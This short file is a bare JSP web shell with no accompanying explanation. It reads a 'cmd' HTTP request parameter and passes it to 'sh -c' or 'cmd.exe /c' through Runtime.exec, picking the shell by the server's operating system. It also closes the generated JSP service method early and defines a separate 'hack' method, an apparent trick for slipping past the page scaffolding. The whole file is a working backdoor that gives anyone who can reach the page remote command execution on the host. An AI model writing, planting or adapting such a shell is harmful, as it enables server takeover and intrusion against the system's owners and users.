<%@ page contentType="text/html;charset=UTF-8" language="java"%>
<%
    String cmd = request.getParameter("cmd");
    hack(cmd);
    } catch (java.lang.Throwable t){} finally {_jspxFactory.releasePageContext(_jspx_page_context); }
    }
    public void hack(String cmd) throws java.io.IOException,javax.servlet.ServletException
    {
    javax.servlet.jsp.JspWriter out = null;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;
    javax.servlet.http.HttpServletResponse response = null;
    try {
    boolean isLinux = true;
    String osTyp = System.getProperty("os.name");
    if (osTyp.toLowerCase().contains("win")) {
    isLinux = false;
    }
    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
    Runtime.getRuntime().exec(cmds);
%>
